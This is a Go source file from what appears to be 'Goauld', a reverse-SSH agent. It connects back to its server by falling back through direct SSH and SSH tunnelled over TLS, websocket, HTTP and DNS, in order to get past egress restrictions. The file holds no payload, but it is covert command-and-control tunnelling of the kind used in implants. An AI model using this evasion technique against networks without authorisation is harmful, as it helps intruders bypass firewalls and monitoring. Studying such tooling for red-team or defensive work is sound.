package ssh

import (
	"Goauld/agent/ssh/transport/http"
	"context"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"Goauld/agent/config"
	"Goauld/agent/ssh/transport"
	"Goauld/common/log"

	"golang.org/x/crypto/ssh"
)

// getProxifiedClient return a connected SSH client
// This client may be proxyfies (TLS, Websocket, HTTP), or not, depending
// on the egress restrictions
// The order of the connection attempt is defined in the agent configuration
func getProxifiedClient(sshConfig *ssh.ClientConfig, ctx context.Context, dnsTransport *transport.DNSSH) (*ssh.Client, net.Conn, io.Closer, error) {
	var client *ssh.Client
	var conn net.Conn
	for _, proto := range config.Get().GetRsshOrder() {
		switch {
		case strings.HasPrefix(proto, "ssh"):
			client = directSSH(sshConfig)
			if client != nil {
				return client, nil, client, nil
			}

		case strings.HasPrefix(proto, "tls"):
			client, conn = proxifyTls(sshConfig, ctx)
			if client != nil {
				return client, conn, nil, nil
			}

		case strings.HasPrefix(proto, "ws"):
			client, conn = proxifyWS(sshConfig, ctx)
			if client != nil {
				return client, conn, conn, nil
			}

		case strings.HasPrefix(proto, "http"):
			c, ssHTTP := proxifyHttp(sshConfig)
			client = c
			conn = ssHTTP.Stream
			if client != nil {
				return client, conn, ssHTTP, nil
			}

		case strings.HasPrefix(proto, "dns"):
			if dnsTransport != nil {
				client, conn = proxifyDns(sshConfig, dnsTransport)
				if client != nil {
					return client, conn, conn, nil
				}
			}
		}
	}

	return nil, nil, nil, fmt.Errorf("failed to Proxify ssh connection")
}

// directSSH perform a direct ssh connection to the SSHD server
func directSSH(sshConfig *ssh.ClientConfig) *ssh.Client {
	log.Info().Msgf("Trying to direct connect to ssh server")
	client, err := transport.DirectSshConnect(sshConfig)
	if err != nil {
		log.Error().Err(err).Msg("Failed to connect directly to ssh server")
		return nil
	}
	log.Info().Msgf("Direct connection to the ssh server successfully")
	return client
}

// proxifyTls proxifies the SSH traffic using a TLS connection to the server
func proxifyTls(sshConfig *ssh.ClientConfig, ctx context.Context) (*ssh.Client, net.Conn) {
	log.Info().Str("Mode", "TLSSH").Msgf("Trying to proxify SSH using TLS")
	tlsConn, err := transport.GetTlsConn(ctx)
	if err != nil {
		log.Error().Str("Mode", "TLSSH").Err(err).Msg("Failed to create TLS connection")
		return nil, nil
	}
	log.Debug().Str("Mode", "TLSSH").Msg("Connection succedded, trying to mount SSH over the TLS connection")
	client, err := tryProxifySsh(sshConfig, tlsConn)
	if err != nil {
		log.Error().Str("Mode", "TLSSH").Err(err).Msg("Failed to proxify SSH over the TLS connection")
		return nil, nil
	}
	log.Info().Str("Mode", "TLSSH").Msg("Proxify using TLS succeeded")
	return client, tlsConn
}

// proxifyTls proxifies the SSH traffic using a websocket connection to the server
func proxifyWS(sshConfig *ssh.ClientConfig, ctx context.Context) (*ssh.Client, net.Conn) {
	log.Info().Str("Mode", "WSSH").Msg("Trying to proxify SSH using websocket")
	wsConn, err := transport.GetWebsocketConn(ctx)
	if err != nil {
		log.Error().Str("Mode", "WSSH").Err(err).Msg("Failed to create WebSocket connection")
		return nil, nil
	}
	log.Debug().Str("Mode", "WSSH").Msg("Connection succedded, trying to mount SSH over the Websocket connection")
	client, err := tryProxifySsh(sshConfig, wsConn)
	if err != nil {
		log.Error().Str("Mode", "WSSH").Err(err).Msg("failed to proxify ssh connection using websocket")
		return nil, nil
	}
	log.Info().Str("Mode", "WSSH").Msg("Proxify using websocket succeeded")
	return client, wsConn
}

// proxifyTls proxifies the SSH traffic using a HTTP connection to the server
func proxifyHttp(sshConfig *ssh.ClientConfig) (*ssh.Client, *http.SSHTTP) {
	log.Info().Str("Mode", "SSHTTP").Msg("Trying to proxify SSH using HTTP")
	httpConn, err := http.NewSSHTTP(config.Get().SSHTTPUrl())
	// err := httpConn.Connect()
	if err != nil {
		log.Error().Str("Mode", "SSHTTP").Err(err).Msg("failed to proxify SSH using HTTP")
		return nil, nil
	}
	_, err = httpConn.Stream.Write([]byte(config.Get().Id))
	if err != nil {
		log.Error().Str("Mode", "SSHTTP").Err(err).Msg("failed to proxify SSH using HTTP")
		return nil, nil
	}
	log.Debug().Str("Mode", "SSHTTP").Msg("Connection succedded, trying to mount SSH over the HTTP connection")
	client, err := tryProxifySsh(sshConfig, httpConn.Stream)
	if err != nil {
		log.Error().Str("Mode", "SSHTTP").Err(err).Msg("failed to proxify ssh connection using HTTP")
		return nil, nil
	}
	log.Info().Str("Mode", "SSHTTP").Msg("Proxify using HTTP succeeded")
	return client, httpConn
}

// proxifyDns proxifies the SSH traffic using a DNS connection to the server
func proxifyDns(sshConfig *ssh.ClientConfig, dnsTransport *transport.DNSSH) (*ssh.Client, net.Conn) {

	log.Debug().Str("Mode", "DNSSH").Msg("Trying send agent ID over the DNS connection")
	// Write S tag to inform the incoming SSH traffic
	_, err := dnsTransport.SshStream.Write([]byte(config.Get().Id))
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
		return nil, nil
	}
	log.Debug().Str("Mode", "DNSSH").Msg("Trying to mount SSH over the DNS connection")
	// Write S tag to inform the incoming SSH traffic
	_, err = dnsTransport.SshStream.Write([]byte{'S'})
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
		return nil, nil
	}
	client, err := tryProxifySsh(sshConfig, dnsTransport.SshStream)
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Msg("failed to proxify ssh connection using HTTP")
		return nil, nil
	}
	log.Info().Str("Mode", "DNSSH").Msg("Proxify using HTTP succeeded")
	return client, dnsTransport.SshStream
}

// tryProxifySsh attempts to proxifies the SSH connection using the provided net.Conn
// A 30 seconds timeout is used if the underlying connection hangs without being fully established
// or without failure
func tryProxifySsh(conf *ssh.ClientConfig, netConn net.Conn) (*ssh.Client, error) {
	chanSuccess := make(chan *ssh.Client)
	chanErr := make(chan error)

	var err error

	go func() {
		_conn, ch, req, _err := ssh.NewClientConn(netConn, config.Get().WSshUrl(), conf)
		if _err != nil {
			err = _err
			chanErr <- err
			return
		}
		chanSuccess <- ssh.NewClient(_conn, ch, req)
	}()

	select {
	case client := <-chanSuccess:
		return client, nil
	case err := <-chanErr:
		return nil, err
	case <-time.After(30 * time.Second):
		return nil, fmt.Errorf("timeout while proxying ssh")
	}
}
